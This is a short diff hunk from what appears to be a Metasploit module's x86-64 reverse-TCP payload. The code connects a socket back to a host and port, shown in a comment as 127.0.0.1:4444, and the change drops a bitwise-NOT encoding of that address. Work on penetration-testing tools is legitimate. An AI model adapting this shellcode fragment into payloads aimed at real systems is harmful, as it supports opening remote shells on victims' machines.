@@ -73,8 +73,7 @@ module MetasploitModule
 
     ; connect (sockfd, {AF_INET,4444,127.0.0.1}, 16);
     mov     rdi, rax
-    mov     rax, ~0x#{encoded_host}#{encoded_port}
-    not     rax
+    mov     rax, 0x#{encoded_host}#{encoded_port}
     push    rax
     push    rsp
     pop     rsi
